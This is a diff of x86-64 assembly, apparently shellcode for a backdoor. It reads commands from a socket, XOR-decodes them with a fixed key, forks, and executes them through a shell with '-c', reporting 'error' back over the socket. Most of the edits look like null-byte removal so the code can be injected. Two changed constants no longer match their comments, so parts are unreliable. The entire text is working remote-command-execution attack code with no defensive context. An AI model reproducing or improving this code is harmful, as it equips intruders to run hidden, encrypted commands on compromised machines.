@@ -55,24 +55,24 @@ _read:
 	xor rcx, rcx
 
 	mov rdi, r15			; rdi <- unsigned int fd
-	
+
 	push sock_buffer
-	mov rsi, rsp			; rsi <- char *buf : 
+	mov rsi, rsp			; rsi <- char *buf :
 					        ; destination (on alloue une la taille de 255 à la mémoire)
 		
-	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
+	mov dl, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
 
     mov rbx, rax            ; get size of what is received
 
-	cmp rax, 0
+	cmp rax, rcx
     jz _exit               ; jump in exit if receved is nothing
 
 _decrypt_xor:              ; xor decrypt function
     ; rsi = buffer
     ; rbx = size buffer
     ; rdx (dl) = xor key
-    mov rdx, 0x35           ; xor_key = 5 (ascii) = 0x35
+    mov dl, 0x35           ; xor_key = 5 (ascii) = 0x35
 
     next_byte:
         xor [rsi+rbx-1], dl
@@ -83,10 +83,11 @@ _decrypt_xor:              ; xor decrypt function
 
 ; ---- (57) sys_fork ----
 _fork:
+    xor rcx, rcx
 	mov al, 57			; sys_fork
 	syscall
 
-	cmp rax, 0			; compare if in child process
+	cmp rax, rcx			; compare if in child process
 	je _execve			; jmp child process to execve
 
     cmp rax, -1
@@ -111,7 +112,7 @@ _execve:
 
 	push rcx			; push 0 -> cleaning stack
 
-	mov r13, 0x632d		; "-c"
+	mov r13, 0x205c632d ; "-c"
 	push r13			; push "-c"
 	mov r14, rsp		; char * '-c'
 	
@@ -151,7 +152,7 @@ _send_error:
 ; ---- (2) sys_write (unsigned int fd, const char *buf, size_t count) ----
     xor rcx, rcx
 
-    mov rcx, 0x726f727265       ; "error"
+    mov rcx, 0x726f727265667266       ; "error"
     push rcx
     mov rsi, rsp                ; rsi = const char *buf
 
@@ -160,7 +161,7 @@ _send_error:
 
     mov rdi, r15
 
-    mov rax, 1
+    mov al, 1
 
     syscall
 
